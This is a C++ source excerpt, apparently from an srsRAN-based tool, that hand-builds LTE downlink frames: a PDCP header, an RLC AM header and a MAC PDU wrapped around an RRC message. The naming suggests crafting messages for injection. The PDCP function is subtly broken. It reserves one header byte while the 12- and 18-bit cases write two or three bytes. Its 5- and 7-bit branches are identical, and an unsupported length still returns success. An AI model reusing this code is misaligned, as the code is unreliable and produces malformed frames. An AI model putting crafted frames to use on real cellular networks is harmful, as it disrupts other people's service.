bool MsgGeneratorForNoSni::add_pdcp_header(
    srsran::unique_byte_buffer_t& rrc_pdu,
    uint32_t pdcp_sn,
    uint8_t sn_len = 5)  // support 5, 7, 12, 18
{
  if (rrc_pdu->get_headroom() < 3) return false; // max 3 bytes for PDCP header

  uint8_t hdr_len = 1;

  rrc_pdu->msg -= hdr_len;
  rrc_pdu->N_bytes += hdr_len;

  switch (sn_len) {
    case PDCP_SN_LEN_5:
    rrc_pdu->msg[0] = SN(pdcp_sn); 
      break;
    case PDCP_SN_LEN_7:
    rrc_pdu->msg[0] = SN(pdcp_sn);   
      break;
    case PDCP_SN_LEN_12:
      uint16_to_uint8(SN(pdcp_sn), rrc_pdu->msg);
      break;
    case PDCP_SN_LEN_18:
      uint24_to_uint8(SN(pdcp_sn), rrc_pdu->msg);
      rrc_pdu->msg[0] |= 0x80; 
      break;
    default:
      printf("error\n");
  }
  return true;
}
// ========== Layer 3: RLC AM Header (with configurable SN) ==========
bool MsgGeneratorForNoSni::build_rlc_am_pdu(
    const srsran::unique_byte_buffer_t& pdcp_sdu,
    uint16_t rlc_sn,
    uint8_t* rlc_buffer,
    size_t buffer_size,
    size_t* out_rlc_len)
{
  const size_t rlc_hdr_min_len = 2; // for SN=0~2047
  if (buffer_size < rlc_hdr_min_len + pdcp_sdu->N_bytes) {
    return false;
  }

  srsran::rlc_amd_pdu_header_t rlc_hdr = {};
  rlc_hdr.dc = srsran::RLC_DC_FIELD_DATA_PDU;
  rlc_hdr.rf = 0;
  rlc_hdr.p  = 1; // polling bit (can be parameterized)
  rlc_hdr.fi = srsran::RLC_FI_FIELD_START_AND_END_ALIGNED;
  rlc_hdr.sn = rlc_sn;
  rlc_hdr.N_li = 0;

  uint8_t* p = rlc_buffer;
  srsran::rlc_am_write_data_pdu_header(&rlc_hdr, &p);
  memcpy(p, pdcp_sdu->msg, pdcp_sdu->N_bytes);

  *out_rlc_len = (p - rlc_buffer) + pdcp_sdu->N_bytes;
  return true;
}

// ========== Layer 4: MAC PDU from RLC SDU ==========
bool MsgGeneratorForNoSni::build_mac_pdu(
    uint8_t* rlc_sdu,
    size_t rlc_sdu_len,
    uint8_t* mac_buffer,
    uint32_t* out_mac_len)
{
  auto& mac_logger = srslog::fetch_basic_logger("MAC");
  uint32_t subheader_len = (rlc_sdu_len >= 128) ? 2 : 1;
  uint32_t total_len = subheader_len + rlc_sdu_len;
  srsran::byte_buffer_t tmp_buf;
  srsran::sch_pdu mac_msg(total_len, mac_logger);
  mac_msg.init_tx(&tmp_buf, total_len, true);
  mac_msg.new_subh();
  mac_msg.get()->set_sdu(1, rlc_sdu_len, rlc_sdu);

  uint8_t* ptr = mac_msg.write_packet(mac_logger);
  uint32_t len = mac_msg.get_pdu_len();

  memcpy(mac_buffer, ptr, len);
  *out_mac_len = len;
  return true;
}
